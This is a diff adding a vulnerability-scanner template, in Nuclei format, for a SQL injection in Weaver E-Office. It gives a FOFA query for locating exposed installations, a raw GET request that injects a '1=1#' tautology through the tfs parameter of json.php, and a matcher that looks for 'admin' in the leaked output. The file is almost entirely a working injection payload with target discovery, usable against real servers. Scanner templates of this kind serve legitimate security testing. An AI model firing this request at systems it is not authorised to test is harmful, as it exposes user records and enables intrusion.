@@ -1,0 +1,24 @@
+id: E-Office_json-sqli
+
+info:
+  name: E-Office_json-sqli
+  author: msksec
+  severity: low
+  metadata: 
+    fofa-query: app="泛微-EOffice"
+
+requests:
+  - raw:
+      - |
+        GET /building/subject/subject/tables/json.php?tfs=user%7C0%7C1%3D1%23 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Connection: close
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "admin")'
+        condition: and
